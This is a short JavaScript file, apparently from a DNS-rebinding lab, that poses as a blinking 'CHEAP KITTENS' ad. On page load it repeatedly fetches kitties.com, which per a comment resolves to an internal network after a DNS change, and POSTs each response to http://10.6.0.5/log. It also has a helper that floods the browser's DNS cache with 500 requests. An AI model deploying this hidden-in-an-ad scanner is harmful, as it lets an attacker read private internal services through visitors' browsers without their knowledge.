window.onload = function(){
    makeAd();
    scanInternalNetwork();
};

function makeAd() {
    ad_div = document.getElementById("ad-target");
    ad_div.innerHTML="<h2>CHEAP KITTENS - ORDER NOW!</h2>";
    toggle = true;
    setInterval(function(){
        if (toggle){
            ad_div.style.backgroundColor = 'yellow';
            toggle = false;
        }else{
            ad_div.style.backgroundColor = 'white';
            toggle = true;
        }
            }, 1000);
}

// Continously queries the origin site.
// If the DNS is changed, the query will be sent to the internal network
// Vanilla JS because the docker-browser has problems with JQuery
// TODO: How to send results to the original site??
function scanInternalNetwork(){
    console.log("Scanning internal network");
    //floodDNSCache();
    setInterval(async function(){
        let res = await fetch("http://kitties.com", {cache: "no-store"});
        let text = await res.text();
        console.log("GOT", text);
        fetch("http://10.6.0.5/log", {cache: "no-store", method: "post", body: text});
  }, 2000);
}

function floodDNSCache(){
    console.log("Flooding DNS cache")
    for (i = 0; i < 500; i++) {
        fetch("http://"+i+".com", {cache: "no-store"});
    } 
}
